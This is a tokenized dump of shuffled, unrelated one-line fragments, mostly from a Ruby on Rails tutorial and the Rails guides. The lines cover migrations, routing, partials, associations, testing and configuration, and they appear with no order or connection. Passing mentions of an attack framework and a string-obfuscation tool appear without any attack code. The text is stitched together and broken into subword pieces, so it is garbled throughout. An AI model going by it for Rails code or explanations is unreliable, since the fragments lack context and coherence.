▁To ▁run ▁these ▁migrations ▁within ▁the ▁context ▁of ▁the ▁application , ▁simply ▁run ▁` rake ╼ db : migrate ` ▖
▁------- ----------------
▁Note ▁that ▁the ▁application ▁will ▁brief ly ▁be ▁in ▁an ▁invalid ▁state ▁after ▁push ing ▁but ▁before ▁the ▁migration ▁is ▁ finished .
▁For ▁example , ▁these ▁files :
▁File ▖ ext name ( filename ) ) ▁ },
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : sign _ in _ success }
▁* ▁How ▁best ▁to ▁use ▁templates , ▁partials , ▁and ▁ layouts .
▁get ▁' / : user name ', ▁to : ▁' users # show '
▁g ▖ or m ▁: active _ record
▁module ▁ActiveRecord :: Core :: Class Methods
▁The ▁result ing ▁\ k ode { gravatar \_ for } ▁helper ▁appears ▁in ▁Listing ~\ ref { code : gravatar _ for _ helper } .
▁A part ▁from ▁an ▁email ▁regular ▁expression , ▁the ▁sample ▁application ▁current ly ▁has ▁no ▁way ▁to ▁verify ▁the ▁ validity ▁of ▁a ▁user ' s ▁email ▁address .
▁< a ▁ href ="# " ▁on click =" this ▖ style ▖ backgroundColor =' # 00 99 00 ' ; this ▖ style ▖ color =' # FFFFFF ' ; "> P aint ▁it ▁green </ a >
▁as ▁show n ▁in ▁Listing ~\ ref { code : relationships _ access _ control } .
▁create ▁app / views / users / index ▖ html ▖ erb
▁This ▁uses ▁a ▁Rails ▁method ▁called ▁\ k ode { add \_ index } ▁to ▁add ▁an ▁index ▁on ▁the ▁\ k ode { email } ▁column ▁of ▁the ▁\ k ode { users } ▁table .
▁When ▁running ▁\ k ode { bundle ▁exec ▁ rspec }, ▁you ▁may ▁have ▁notice d ▁that ▁it ▁take s ▁sever al ▁second s ▁just ▁to ▁start ▁running ▁the ▁tests , ▁but ▁once ▁they ▁start ▁running ▁they ▁finish ▁quickly .
▁You ▁can ▁render ▁the ▁default ▁view ▁for ▁a ▁Rails ▁template , ▁or ▁a ▁specific ▁template , ▁or ▁a ▁file , ▁or ▁ inline ▁code , ▁or ▁not h ing ▁at ▁all ▖
▁ Library ▁module s
▁< script ▁src =' / assets / main ▖ js ' ></ script >
▁C on tain s ▁static ▁files ▁and ▁ compiled ▁assets .
▁You ▁can ▁specify ▁the ▁content ▁type ▁or ▁HTTP ▁status ▁of ▁the ▁rendered ▁response ▁as ▁well .
▁* ▁` ActionDispatch :: ParamsParser ` ▁ parse s ▁out ▁parameters ▁from ▁the ▁request ▁into ▁` params ` .
▁Ou r ▁method ▁is ▁to ▁create ▁a ▁database ▁\ emph { index } ▁on ▁the ▁email ▁column , ▁and ▁then ▁require ▁that ▁the ▁index ▁be ▁unique .
▁In side ▁the ▁file ▁for ▁the ▁custom ▁CSS , ▁we ▁can ▁use ▁the ▁\ k ode {@ import } ▁function ▁to ▁include ▁Bootstrap ▁( to get her ▁with ▁the ▁ associated ▁Sprockets ▁ utility ), ▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ css }
▁( This ▁applies ▁to ▁CSS ▁and ▁JavaScript ▁but ▁not ▁to ▁images ▖)
▁We ' ll ▁also ▁add ▁a ▁way ▁to ▁\ emph { authenticate } ▁a ▁user ▁base d ▁on ▁a ▁given ▁password , ▁a ▁method ▁we ' ll ▁use ▁in ▁Chapter ~\ ref { cha : basic _ login } ▁to ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁site .
▁#### ▁Other ▁Date ▁Co m put ation s
▁There ' s ▁an ▁ additional ▁ com plication , ▁though : ▁we ▁want ▁to ▁\ emph { associate } ▁each ▁micropost ▁with ▁a ▁particular ▁user ▖ ▁We ' ll ▁accomplish ▁this ▁by ▁record ing ▁the ▁\ k ode { user \_ id } ▁of ▁the ▁ owner ▁of ▁the ▁post .
▁By ▁default , ▁Heroku ▁uses ▁a ▁p ure - Ruby ▁ webserver ▁called ▁ WEBrick , ▁which ▁is ▁easy ▁to ▁set ▁up ▁and ▁run ▁but ▁isn ' t ▁good ▁at ▁handling ▁significant ▁traffic .
▁* ▁` config ▖ assets ▖ debug ` ▁disable s ▁the ▁ concat en ation ▁and ▁compression ▁of ▁assets ▖
▁ Order ▖ select (" date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price ")▖ group (" date ( created _ at ) ")
▁ SELECT ▁date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price
▁# ▁C url y ▁braces ▁on ▁final ▁hash ▁arguments ▁are ▁optional .
▁We ▁won ' t ▁be ▁using ▁the ▁\ k ode { example \_ user ▖ rb } ▁file ▁from ▁Section ~\ ref { sec : a _ user _ class }, ▁so ▁I ▁suggest ▁remov ing ▁it :
▁But ▁the ▁following ▁will ▁ _ not _ ▁work , ▁because ▁` Supplier ` ▁and ▁` Account ` ▁are ▁defined ▁in ▁different ▁scope s :
▁< li >`: argument s ` ▁- ▁The ▁command ▁line ▁arguments ▁to ▁be ▁passed ▁to ▁ sendmail ▖
▁name ▁= ▁' % s ▁( % ▖ 1 f m s ) ' ▁% ▁[ name ▁|| ▁' SQL ', ▁m s ]
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / m ar sh al ▖ rb ` .
▁The ▁\ k ode { Application Controller } ▁class , ▁with ▁inheritance .
▁The ▁ s tab by ▁ lambda ▁\ k ode { - > } ▁take s ▁in ▁a ▁block ▁( Section ~\ ref { sec : block s }) ▁and ▁returns ▁a ▁ Proc , ▁which ▁can ▁then ▁be ▁evaluated ▁with ▁the ▁\ k ode { call } ▁method .
▁Rails ▁display s ▁useful ▁debug ▁information ▁via ▁the ▁\ k ode { debug } ▁method .
▁A ▁micropost ▁belongs ▁to ▁a ▁user .
▁As ▁we ▁ learned ▁in ▁Section ~\ ref { sec : layouts }, ▁the ▁\ k ode { yield } ▁method ▁insert s ▁the ▁contents ▁of ▁each ▁page ▁into ▁the ▁site ▁layout .
▁The ▁tests ▁in ▁Listing ~\ ref { code : action _ tests _ admin } ▁verify ▁the ▁behavior ▁in ▁the ▁case ▁of ▁an ▁un authorize d ▁( n on - admin ) ▁user , ▁but ▁we ▁also ▁want ▁to ▁check ▁that ▁an ▁admin ▁can ▁use ▁a ▁delete ▁link ▁to ▁successfully ▁destroy ▁a ▁user .
▁That ▁idiom ▁may ▁con ve y ▁ _ group ing _ ▁to ▁the ▁reader ▁as ▁well ▖
▁If ▁you ▁like , ▁you ▁can ▁verify ▁that ▁the ▁form ▁show n ▁in ▁Figure ~\ ref { fig : home _ with _ form } ▁is ▁working ▁by ▁ submitting ▁a ▁valid ▁entry ▁and ▁then ▁ nav ig ating ▁to ▁the ▁\ href { http ://0▖0▖0▖0:3000/ users /1 } { profile ▁page } ▁to ▁see ▁the ▁post , ▁but ▁that ' s ▁rather ▁cumbersome .
▁ --------------- ----------------
▁A c t u ally ▁\ emph { count ing } ▁columns ▁could ▁d r ive ▁you ▁c ra z y , ▁which ▁is ▁why ▁many ▁text ▁editor s ▁have ▁a ▁ visual ▁a id ▁to ▁help ▁you .
▁ attr _ accessor ▁: author _ name
▁However , ▁if ▁you ▁have ▁external ▁data ▁that ▁is ╼ not ▁store d ▁as ▁ UT F -8 , ▁it ▁can ▁ o cc as ion ally ▁result ▁in ▁these ▁kind s ▁of ▁issues ▁that ╼ cannot ▁be ▁automatically ▁ de t ec ted ▁by ▁Rails ▁and ▁correct ed .
▁Of ▁course , ▁the ▁ footer ▁will ▁be ▁ugly ▁without ▁some ▁styling ▁( Listing ~\ ref { code : footer _ css }) .
▁For ▁one , ▁practical ▁experience ▁shows ▁that ▁authentication ▁on ▁most ▁site s ▁requires ▁ ext en s ive ▁custom i z ation , ▁and ▁modify ing ▁a ▁third - part y ▁ product ▁is ▁often ▁more ▁work ▁than ▁writing ▁the ▁system ▁from ▁scratch .
▁Here ▁\ k ode { sequence } ▁take s ▁a ▁symbol ▁corresponding ▁to ▁the ▁desired ▁attribute ▁( such ▁as ▁\ k ode { : name }) ▁and ▁a ▁block ▁with ▁one ▁variable , ▁which ▁we ▁have ▁called ~\ k ode { n } .
▁To ▁enable ▁this ▁option ▁set :
▁We ▁can ▁then ▁have ╼ framework ▁features ▁and ▁other ▁gems ▁build ▁on ▁to p ▁of ▁that , ▁without ▁ having ▁to ╼ w or ry ▁about ▁API ▁difference s ▁between ▁ various ▁job ▁run n ers ▁such ▁as ▁De la y ed ▁Job ╼ and ▁Re s q ue ▖
▁How ▁ detailed ▁you ▁want ▁to ▁make ▁your ▁tests ▁is ▁up ▁to ▁you ; ▁a ▁suggest ed ▁ ul t ra - mini ma list ▁template ▁appears ▁in ▁Listing ~\ ref { code : flash _ test }, ▁which ▁you ▁should ▁complete ▁by ▁replacing ▁\ k ode { FILL \_ IN } ▁with ▁the ▁appropriate ▁code .
▁Note ▁that ▁\ k ode { User ▖ create }, ▁rather ▁than ▁return ing ▁\ k ode { true } ▁or ▁\ k ode { false }, ▁returns ▁the ▁User ▁object ▁itself , ▁which ▁we ▁can ▁optional ly ▁assign ▁to ▁a ▁variable ▁( such ▁as ▁\ k ode { foo } ▁in ▁the ▁second ▁command ▁above ) .
▁Otherwise ▁you ▁won ' t ▁be ▁able ▁use ▁page ▁ caching ▁and ▁requests ▁for ▁files ▁that ▁exist ▁regular ly ▁under ▁the ▁public ▁directory ▁will ▁any way ▁hit ▁your ▁Rails ▁app .
▁ attr _ internal ▁: c a p t ure s
▁Here ▁we ▁pass ▁a ▁\ k ode { : collection } ▁parameter ▁with ▁the ▁feed ▁ items , ▁which ▁cause s ▁\ k ode { render } ▁to ▁use ▁the ▁given ▁partial ▁(\ k ode { ' feed \_ item ' } ▁in ▁this ▁case ) ▁to ▁render ▁each ▁item ▁in ▁the ▁collection .
▁You ▁should ▁edit ▁this ▁file ▁to ▁tell ▁other s ▁what ▁your ▁application ▁does , ▁how ▁to ▁set ▁it ▁up , ▁and ▁so ▁on .
▁#### ▁The ▁` as ` ▁and ▁` object ` ▁options
▁Now ▁make ▁sure ▁that ▁the ▁tests ▁are ▁\ passing :
▁This ▁is ▁because ▁we ▁don ' t ▁need ▁the ▁controller ▁tests ▁( p ref er r ing ▁instead ▁to ▁use ▁an ▁integration ▁test ▁( Section ~\ ref { sec : activation _ test _ and _ refactoring }) ), ▁so ▁it ' s ▁convenient ▁to ▁omit ▁them .
▁We ' ll ▁first ▁look ▁at ▁the ▁out er ▁structure , ▁which ▁consist s ▁of ▁ embedded ▁Ruby ▁open ing ▁with ▁a ▁call ▁to ▁\ k ode { form \_ for } ▁and ▁ closing ▁with ▁\ k ode { end } :
▁For ▁example , ▁let ' s ▁say ▁we ▁have ▁a ▁standard ▁application ▁layout , ▁but ▁also ▁a ▁special ▁page ▁that ▁requires ▁certain ▁JavaScript ▁that ▁the ▁rest ▁of ▁the ▁site ▁doesn ' t ▁need ▖
▁App r o p ri ate ly , ▁this ▁section ▁contains ▁some ▁of ▁the ▁most ▁advanced ▁material ▁in ▁the ▁entire ▁tutorial .
▁You ▁can ▁learn ▁more ▁about ▁query ing ▁an ▁Active ▁Record ▁model ▁in ▁the ▁[ Active ▁Record ╼ Query ▁Interface ]( active _ record _ query ing ▖ html ) ▁guide .
▁* ▁` engine s _ blank _ point ` ▁Provide s ▁a ▁point - in - initial i z ation ▁to ▁ hook ▁into ▁if ▁you ▁wish ▁to ▁do ▁anything ▁before ▁engines ▁are ▁loaded ▖
▁The ▁simple st ▁rule ▁of ▁thumb ▁is ▁that ▁you ▁should ▁set ▁up ▁a ▁` has _ many ▁: through ` ▁relationship ▁if ▁you ▁need ▁to ▁work ▁with ▁the ▁relationship ▁model ▁as ▁an ▁in dependent ▁ entity ▖
▁TIP : ▁Rails ▁also ▁make s ▁a ▁ counter ▁variable ▁available ▁within ▁a ▁partial ▁called ▁by ▁the ▁collection , ▁named ▁after ▁the ▁ member ▁of ▁the ▁collection ▁followed ▁by ▁` _ counter ` ▖
▁(1▖▖10 ) ▁= == ▁( 0 ▖ ▖ 7 ) ▁# ▁=> ▁false
▁invoke ▁ erb
▁* ▁` config ▖ cache _ classes ` ▁control s ▁whether ▁or ▁not ▁application ▁classes ▁and ▁module s ▁should ▁be ▁ reload ed ▁on ▁each ▁request ▖
▁( If ▁you ▁have n ' t ▁restart ed ▁the ▁Rails ▁server ▁since ▁adding ▁ bcrypt , ▁you ▁may ▁have ▁to ▁do ▁so ▁at ▁this ▁time ▖)
▁### ▁Read
▁as ▁show n ▁in ▁Listing ~\ ref { code : c a p y bar a _ d s l } .
▁belongs _ to ▁: customer , ▁ counter _ cache : ▁true
▁#### # ▁` prev _ year `, ▁` next _ year `
▁A ▁mockup ▁of ▁the ▁ stats ▁partial .
▁TIP : ▁If ▁you ▁have ▁any ▁ ordering ▁ dependency ▁in ▁your ▁ initializers , ▁you ▁can ▁control ▁the ▁load ▁order ▁through ▁naming ▖
▁Un like ▁the ▁migration ▁for ▁users , ▁the ▁email ▁uniqueness ▁migration ▁is ▁not ▁pre - defined , ▁so ▁we ▁need ▁to ▁fill ▁in ▁its ▁contents ▁with ▁Listing ~\ ref { code : email _ uniqueness _ index }
▁A ▁great ▁tool ▁to ▁ ob f us c ate ▁and ▁ en code ▁strings , ▁and ▁thus ▁" get ▁to ▁know ▁your ▁ en e my ", ▁is ▁the ▁[ H ac k ve r to r ]( https :// h ac k ve r to r ▖ co ▖ u k / public )▖
▁ Previous ▁versions ▁of ▁Rails ▁used ▁a ▁method ▁called ▁\ k ode { attr \_ accessible } ▁in ▁the ▁\ emph { model } ▁layer ▁to ▁solve ▁this ▁problem , ▁but ▁as ▁of ▁Rails ~4▖0 ▁the ▁preferred ▁technique ▁is ▁to ▁use ▁so - called ▁\ emph { strong ▁parameters } ▁in ▁the ▁controller ▁layer .
▁* ▁` en sure _ autoload _ once _ paths _ as _ subset ` ▁En sure s ▁that ▁the ▁` config ▖ autoload _ once _ paths ` ▁only ▁contains ▁paths ▁from ▁` config ▖ autoload _ paths ` ▖
▁The ▁big g est ▁difference ▁is ▁that , ▁while ▁any one ▁can ▁sign ▁up , ▁only ▁the ▁current ▁user ▁should ▁be ▁able ▁to ▁update ▁their ▁information .
▁This ▁install s ▁the ▁gem ▁\ k ode { coffee - rails } ▁as ▁long ▁as ▁it ' s ▁new er ▁than ▁version ~\ k ode { 4▖0▖0 } ▁and ▁\ emph { not } ▁new er ▁than ▁\ k ode { 4 ▖ 1 } .
▁* ▁` config ▖ reload _ classes _ only _ on _ change ` ▁enable s ▁or ▁disable s ▁ reload ing ▁of ▁classes ▁only ▁when ▁ track ed ▁files ▁change ▖
▁ ╼ ▁* ▁this ▁ stuff ▁is ▁worth ▁it , ▁you ▁can ▁b u y ▁me ▁a ▁be er ▁in ▁return .
▁class ▁Read Only Model ▁< ▁ActiveRecord :: Base
▁This ▁make s ▁sure ▁that ▁there ▁is ▁an ▁\ k ode { input } ▁tag ▁with ▁the ▁right ▁name , ▁( hidden ) ▁type , ▁and ▁email ▁address :
▁* ▁`: port ` ▁- ▁On ▁the ▁off ▁chance ▁that ▁your ▁mail ▁server ▁doesn ' t ▁run ▁on ▁ port ▁ 25 , ▁you ▁can ▁change ▁it .
▁In ▁this ▁section , ▁we ' ll ▁log ▁the ▁user ▁in ▁with ▁a ▁temporary ▁session ▁cookie ▁that ▁ expire s ▁automatically ▁upon ▁browser ▁close .
▁ Adding ▁a ▁`` Settings '' ▁link .
▁For ▁example ,
▁user ▁= ▁User ▖ create ( name : ▁" David ", ▁ occupation : ▁" Code ▁Artist ")
▁as ▁show n ▁in ▁Listing ~\ ref { code : layout _ signin _ signout _ links } .
▁### ▁Re de f in ing ▁ Methods
▁config ▖ middleware ▖ use ▁M a g ical :: Uni c or n s
▁It ' s ▁important ▁to ▁note ▁that ▁the ▁ curl y ▁braces ▁for ▁hashes ▁have ▁not h ing ▁to ▁do ▁with ▁the ▁ curl y ▁braces ▁for ▁blocks .
▁This ▁install s ▁the ▁latest ▁version ▁of ▁the ▁\ k ode { uglifier } ▁gem ▁( which ▁handle s ▁file ▁compression ▁for ▁the ▁asset ▁pipeline ) ▁as ▁long ▁as ▁it ' s ▁ greater ▁than ▁or ▁equal ▁to ▁version ~\ k ode { 1 ▖ 3▖0 } --- even ▁if ▁it ' s , ▁say , ▁version ~\ k ode { 7▖2 } .
▁The ▁association ▁method ▁would ▁override ▁the ▁base ▁method ▁and ▁break ▁things ▖
▁The ▁` parent ` ▁method ▁on ▁a ▁nested ▁named ▁module ▁returns ▁the ▁module ▁that ▁contains ▁its ▁corresponding ▁constant :
▁too _ sh or t : ▁" must ▁have ▁at ▁least ▁% { count } ▁words ",
▁$ ▁git ▁re base ▁ upstream / master
▁S e ar ch ed ▁in : ▁*
▁As ▁a ▁rule ▁of ▁thumb ▁you ▁can ▁think ▁of ▁this ▁method ▁as ▁the ▁one ▁that ▁ transform s ▁paths ▁into ▁Ruby ▁class ▁or ▁module ▁names , ▁where ▁ slash es ▁separate ▁ namespace s :
▁If ▁this ▁discussion ▁seem s ▁a ▁bit ▁abstract ▁right ▁now , ▁worry ▁not ; ▁we ' ll ▁refer ▁back ▁to ▁this ▁section ▁f r equ ent ly .
▁$ ▁git ▁fetch ▁ upstream
▁ Hash ▖ new ( middleware s )
▁O b v i ous ly , ▁you ' ll ▁want ▁to ▁be ▁a ▁bit ▁more ▁sophisticat ed ▁than ▁that , ▁but ▁it ' s ▁a ╼ start ▖
▁If ▁you ▁look ▁at ▁the ▁\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { secure ▁password ▁source ▁code }, ▁you ' ll ▁find ▁a ▁compar is on ▁like ▁this
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ▁ finished ▁making ▁a ▁basic ▁Users ▁resource ▁( filling ▁in ▁all ▁the ▁standard ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users }), ▁together ▁with ▁a ▁flexible ▁authentication ▁and ▁ authorization ▁system .
▁In ▁Chapter ~\ ref { cha : basic _ login }, ▁we ' ll ▁then ▁use ▁the ▁authentication ▁machinery ▁from ▁Section ~\ ref { sec : adding _ a _ secure _ password } ▁to ▁let ▁users ▁log ▁into ▁the ▁site .
▁| ▁PR IM A RY ▁| ▁4 ▁| ▁ const ▁| ▁1 ▁| ▁|
▁The ▁route r ▁also ▁routes ▁` PATCH ` ▁requests ▁to ▁` / users / : id ` ▁to ▁the ▁` update ` ▁action .
▁Fin ally , ▁why ▁does ▁Ruby ▁correctly ▁interpret ▁the ▁lines
▁We ▁saw ▁in ▁Section ~\ ref { sec : a _ users _ resource } ▁how ▁the ▁information ▁in ▁the ▁\ k ode { debug } ▁could ▁help ▁us ▁understand ▁what ' s ▁going ▁on ▁in ▁our ▁application .
▁If ▁this ▁object ▁respond s ▁to ▁the ▁` middleware ` ▁method , ▁its ▁middleware ▁is ▁inserted ▁before ▁` Rack :: Runtime ` ▁in ▁the ▁middleware ▁ stack .
▁So ▁far ▁we ' ve ▁used ▁strings ▁as ▁hash ▁keys , ▁but ▁in ▁Rails ▁it ▁is ▁much ▁more ▁common ▁to ▁use ▁\ emph { symbols } ▁instead .
▁The ▁options ▁argument ▁is ▁interpret ed ▁as ▁a ▁hash ▁of ▁header ▁names ▁and ▁values ▖
▁Use ▁it ▁only ▁if ▁you ▁know ▁the ▁hard - code d ▁list ▁is ▁enough ▁in ▁your ▁use ▁case .
▁[ M p ac k ]( http :// p and al abs ▖ p and a security ▖ com / mp ac k - un c over ed / ) ▁is ▁a ▁very ▁active ▁and ▁up - to - date ▁attack ▁framework ▁which ▁ exploit s ▁these ▁vulnerabilities ▖
▁\ emph { Hint } : ▁To ▁check ▁for ▁a ▁valid ▁\ k ode { picture } ▁attribute , ▁use ▁the ▁\ k ode { assigns } ▁method ▁mentioned ▁in ▁Section ~\ ref { sec : activation _ test _ and _ refactoring } ▁to ▁access ▁the ▁micropost ▁in ▁the ▁\ k ode { create } ▁action ▁after ▁valid ▁submission .
▁Action ▁Mailer ▁will ▁automatically ▁send ▁ multipart ▁email s ▁if ▁you ▁have ▁different ╼ template s ▁for ▁the ▁same ▁action ▖
▁* ▁` reverse _ order `
▁| config / | C on figure ▁your ▁application ' s ▁routes , ▁database , ▁and ▁more ▖
▁* ▁Noti f ies ▁the ▁log s ▁that ▁the ▁request ▁has ▁be g an ▖
▁in ▁Listing ~\ ref { code : micropost _ belongs _ to _ user _ spec } ▁and
▁To ▁get ▁started , ▁we ▁first ▁generate ▁an ▁integration ▁test ▁file ▁for ▁ signing ▁up ▁users , ▁which ▁we ' ll ▁call ▁\ k ode { users \_ signup } ▁( a do p ting ▁the ▁controller ▁convention ▁of ▁a ▁plural ▁resource ▁name ) :
▁ Visit ▁another ▁page ▁( such ▁as ▁the ▁Home ▁page ) .
▁#### # ▁`: class _ name `
▁all ▁copie s ▁or ▁substan tial ▁ port ion s ▁of ▁the ▁ Software .
▁The ▁result ing ▁\ k ode { gravatar \_ for } ▁helper ▁appears ▁in ▁Listing ~\ ref { code : gravatar _ for _ helper } .
▁=> ▁#< Person ▁id : ▁nil , ▁name : ▁" John ▁Doe ", ▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁### ▁Access ing
▁### ▁Configur ing ▁Action ▁Dispatch
▁We ▁then ▁apply ▁the ▁migration ▁as ▁usual :
▁# ▁it ▁will ▁be ▁possible ▁to ▁update ▁email ▁with ▁a ▁duplicate d ▁value
▁ Make ▁the ▁following ▁changes ▁to ▁your ▁` Gemfile ` .
▁The ▁technique ▁ sprockets ▁uses ▁for ▁fingerprint ing ▁is ▁to ▁insert ▁a ▁hash ▁of ▁the ╼ content ▁into ▁the ▁name , ▁usually ▁at ▁the ▁end ▖
▁| ▁POST ▁| ▁ / magazine s / : magazine _ id / ads ▁| ▁ ads # create ▁| ▁create ▁a ▁new ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁For ▁example , ▁we ▁can ▁check ▁if ▁the ▁followed ▁users ▁collection ▁includes ▁another ▁user ▁with ▁the ▁\ k ode { include ?}\ ▁method ▁( Section ~\ ref { sec : array s _ and _ range s }), ▁or ▁find ▁objects ▁through ▁the ▁association :
▁To ▁make ▁use ▁of ▁\ k ode { store \_ location }, ▁we ▁need ▁to ▁add ▁it ▁to ▁the ▁\ k ode { logged \_ in \_ user } ▁before ▁filter , ▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ store _ location } .
▁Section ~\ ref { sec : hello _ world } ▁shows ▁a ▁first ▁t ent a tive ▁application ▁of ▁ MVC , ▁while ▁Section ~\ ref { sec : mvc _ in _ action } ▁includes ▁a ▁more ▁ detailed ▁discussion ▁of ▁ MVC ▁in ▁the ▁context ▁of ▁the ▁toy ▁app .
▁#< User ▁id : ▁3 , ▁name : ▁" Foo ", ▁email : ▁" foo @ bar ▖ com ", ▁created _ at : ▁"2013-03-11
▁# ▁=> ▁{" a " =>2}
▁in ▁Listing ~\ ref { code : microposts _ create _ tests } .
▁It ' s ▁a ▁good ▁thing , ▁too , ▁because ▁it ▁means ▁we ▁can ▁include ▁the ▁HTML 5 ▁ shim ▁\ emph { only } ▁for ▁ IE ▁browsers ▁less ▁than ▁version ~ 9 , ▁leav ing ▁other ▁browsers ▁such ▁as ▁ Firefox , ▁C h r o me , ▁and ▁ Safari ▁un a ffect ed .
▁You ▁may ▁have ▁notice d ▁that ▁our ▁tests ▁for ▁the ▁layout ▁links ▁test ▁the ▁routing ▁but ▁don ' t ▁actually ▁check ▁that ▁the ▁links ▁on ▁the ▁layout ▁go ▁to ▁the ▁right ▁pages .
▁When ▁a ▁new ▁micropost ▁is ▁made ▁in ▁this ▁way , ▁its ▁\ k ode { user \_ id } ▁is ▁\ emph { a utomatically } ▁set ▁to ▁the ▁right ▁value .
▁A re ▁there ▁any ▁tests ▁missing ?
▁NOTE : ▁ _ U se ▁user - s up p li ed ▁command ▁line ▁parameters ▁with ▁caution .
▁``` n g in x
▁You ▁ probably ▁want ▁to ▁do ▁something ▁upon ▁a ▁successful ▁submission ▖
▁To ▁save ▁ having ▁to ▁call ▁` constantize ` ▁on ▁the ▁` author _ class ` ▁result ▁all ▁the ▁time ,╼ you ▁could ▁instead ▁just ▁override ▁the ▁` author _ class ` ▁get ter ▁method ▁inside ▁the ╼` Blorgh ` ▁module ▁in ▁the ▁` lib / blorgh ▖ rb ` ▁file ▁to ▁always ▁call ▁` constantize ` ▁on ▁the ╼ save d ▁value ▁before ▁return ing ▁the ▁result :
▁In ▁either ▁case , ▁the ▁result ▁should ▁look ▁something ▁like ▁Figure ~\ ref { fig : riding _ rails } .
▁t ▖ prev _ quarter ▁# ▁=> ▁Mon , ▁ 08 ▁Feb ▁2010
▁At ▁this ▁point , ▁in ▁real ▁ life ▁I ▁would ▁consider ▁writing ▁an ▁integration ▁test ▁to ▁capture ▁the ▁behavior ▁describe d ▁above .
▁` Array # to _ param ` ▁calls ▁` to _ param ` ▁on ▁the ▁elements ▁and ▁ joins ▁the ▁result ▁with ▁"/ " :
▁( Re call ▁the ▁association ▁of ▁HTTP ▁verb s ▁with ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users } ▖)
▁# ▁S pe ed ▁up ▁tests ▁by ▁lower ing ▁ bcrypt ' s ▁ cost ▁function .
▁person ▁= ▁Person ▖ new ( name : ▁" John ▁Doe ")
▁# ▁Rails ▖ backtrace _ cleaner ▖ remove _ silencer s !
▁The ▁routes ▁for ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions ▁in ▁the ▁Static ▁Pages ▁controller .
▁Un less ▁the ▁name ▁of ▁the ▁join ▁table ▁is ▁explicitly ▁specified ▁by ▁using ▁the ▁`: join _ table ` ▁option , ▁Active ▁Record ▁creates ▁the ▁name ▁by ▁using ▁the ▁ le x ical ▁order ▁of ▁the ▁class ▁names ▖
▁The ▁` Rails :: Server ` ▁inherit s ▁from ▁` Rack :: Server ` ▁and ▁calls ▁the ▁` Rack :: Server # start ` ▁method ▁this ▁way :
▁in ▁Listing ~\ ref { code : user _ show _ page _ test } .
▁A ▁custom ▁Home ▁page .
▁At ▁the ▁root ▁of ▁this ▁br and ▁new ▁engine ' s ▁directory ▁live s ▁a ▁` blorgh ▖ gem spec ` ▁file ▖╼
▁Fri end ly ▁ forwarding ▁redirect s ▁users ▁where ▁they ▁want ed ▁to ▁go ▁after ▁logging ▁in .
▁( In ▁fact , ▁some ▁languages , ▁es pecially ▁ Perl , ▁some times ▁call ▁hashes ▁\ emph { assoc ia tive ▁arrays } ▁for ▁this ▁reason ▖)
▁However , ▁as ╼ part ▁of ▁the ▁re write , ▁the ▁following ▁features ▁have ▁been ▁removed ▁from ▁the ▁ en code r :
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / start s _ end s _ with ▖ rb ` .
▁* ▁PostgreSQL : ▁[ U s ing ▁ EXPLAIN ]( http :// www ▖ postgresql ▖ org / docs / current / static / using - explain ▖ html )
▁ Adding ▁the ▁\ k ode { belongs \_ to } ▁associations ▁to ▁the ▁Relationship ▁model .
▁customer =
▁This ▁helper ▁count s ▁characters ▁by ▁default , ▁but ▁you ▁can ▁ split ▁the ▁value ▁in ▁a ╼ different ▁way ▁using ▁the ▁`: token ize r ` ▁option :
▁To ▁get ▁the ▁previous ▁behavior ▁it ▁is ▁needed ▁to ▁explicitly ▁remove ▁the ╼` default _ scope ` ▁ condition ▁using ▁` unscope d `, ▁` unscope `, ▁` re where ` ▁or ╼` except ` .
▁### ▁In ter pre ting ▁ EXPLAIN
▁The ▁most ▁generic ▁way ▁to ▁jump ▁to ▁other ▁day s ▁is ▁` advance ` ▖
▁Support ed ▁options ▁are :
▁Find ▁an ▁online ▁version ▁of ▁the ▁Ruby ▁API ▁and ▁read ▁about ▁the ▁ Hash ▁method ▁\ k ode { merge } .
▁Be ▁sure ▁to ▁un comment ▁the ▁lines ▁in ▁the ▁test ▁group ▁relevant ▁for ▁your ▁system .
▁### ▁Active ▁Support
▁In ▁this ▁section , ▁we ' ll ▁show ▁how ▁to ▁use ▁\ href { https :// github ▖ com / guard / guard } { Guard } ▁to ▁automate ▁the ▁running ▁of ▁the ▁tests .
▁TIP : ▁This ▁is ▁useful ▁when ▁you ' re ▁rendering ▁a ▁small ▁ s n ip pe t ▁of ▁HTML ▁code .
▁# ▁< objects ▁type =" array ">
▁has _ many ▁: confirmed _ orders , ▁-> ▁ { ▁where ▁ confirmed : ▁true ▁ },
▁render ▁"/ path / to / rails / app / views / books / edit "
▁Do ╼ note ▁that ▁using ▁ force ▁push ▁may ▁result ▁in ▁commit s ▁being ▁ lo st ▁on ▁the ▁remote ▁branch ; ▁use ▁it ▁with ▁care .
▁Gemfile
▁Similar ly , ▁to ▁test ▁successful ▁signin , ▁we ▁could ▁add ▁this :
▁So , ▁for ╼ a ▁class ▁` Book `, ▁you ▁should ▁have ▁a ▁database ▁table ▁called ▁** books ** ▖
▁* ▁How ▁to ▁use ▁partials ▁to ▁ DRY ▁up ▁your ▁views .
▁B oth ▁of ▁these ▁views ▁are ▁just ▁place h ol d ers : ▁they ▁have ▁a ▁to p - level ▁ head ing ▁( in side ▁the ▁\ k ode { h 1 } ▁tag ) ▁and ▁a ▁pa ra gr a ph ▁(\ k ode { p } ▁tag ) ▁with ▁the ▁full ▁path ▁to ▁the ▁corresponding ▁file .
▁The ▁way ▁to ▁achieve ▁this ▁in ▁Rails ▁is ▁to ▁use ▁a ▁facilit y ▁called ▁\ emph { partial s } .
▁# ▁=> ▁ 555-1234
▁ Integration ▁tests ▁effective ly ▁simul ate ▁a ▁browser ▁click ing ▁from ▁page ▁to ▁page .
▁This ▁will ▁generate ▁this ▁HTML ▁output :
